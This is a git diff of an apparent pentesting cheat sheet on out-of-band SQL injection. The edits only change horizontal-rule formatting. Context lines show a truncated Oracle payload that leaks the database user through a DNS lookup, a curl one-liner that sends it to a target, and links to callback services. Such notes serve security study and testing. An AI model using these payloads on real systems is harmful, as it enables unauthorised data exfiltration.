@@ -16,7 +16,7 @@ linked:
 ---
 # SQLi - Out of Band
 
-***
+---
 
 ## Cheatsheet
 
@@ -57,7 +57,7 @@ PAYLOAD="' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)\\|\
 curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")"
 ```
 
-___
+---
 
 ## Overview
 
@@ -76,4 +76,4 @@ ___
 - [interactsh](https://github.com/projectdiscovery/interactsh) (open source).
 - [DNSBin](http://dnsbin.zhack.ca/) (web-based).
 
-***
+---
